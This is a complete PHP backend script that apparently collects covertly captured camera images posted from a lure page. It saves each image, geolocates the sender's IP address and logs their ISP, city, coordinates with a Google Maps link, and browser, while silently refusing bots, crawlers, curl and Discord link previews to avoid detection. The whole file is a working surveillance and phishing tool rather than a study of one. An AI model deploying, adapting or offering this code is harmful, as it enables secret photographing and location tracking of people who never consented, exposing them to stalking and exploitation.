<?php

date_default_timezone_set("Asia/Kuala_Lumpur");
$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$Browser = $_SERVER['HTTP_USER_AGENT'];

// Stop bot
if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}


$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));

$Country = $Details->country ?? 'Unknown';
$CountryCode = $Details->countryCode ?? '-';
$Region = $Details->regionName ?? '-';
$City = $Details->city ?? '-';
$Zip = $Details->zip ?? '-';
$Lat = $Details->lat ?? '-';
$Lon = $Details->lon ?? '-';
$isp = $Details->isp ?? '-';


$img = $_POST['cat'];
$folderPath = "images/";

$image_parts = explode(";base64,", $img);
$image_base64 = base64_decode($image_parts[1]);

$fileName ='img_'.date('Y-m-d-H-i-s').'.png';
$file = $folderPath . $fileName;

file_put_contents($file, $image_base64);
//LOG (DASHBOARD)
$log = "Time: ".date("Y-m-d H:i:s")."\n";
$log .= "IP: ".$IP."\n";
$log .= "ISP: ".$isp."\n";
$log .= "Country: ".$Country." (".$CountryCode.")\n";
$log .= "Region: ".$Region."\n";
$log .= "City: ".$City."\n";
$log .= "Zip: ".$Zip."\n";
$log .= "Maps: https://www.google.com/maps?q=".$Lat.",".$Lon."\n";
$log .= "Browser: ".$Browser."\n";
$log .= "Image: ".$file."\n";
$log .= "-----------------------------\n";

file_put_contents("log.txt", $log, FILE_APPEND);

// response
echo "success";

?>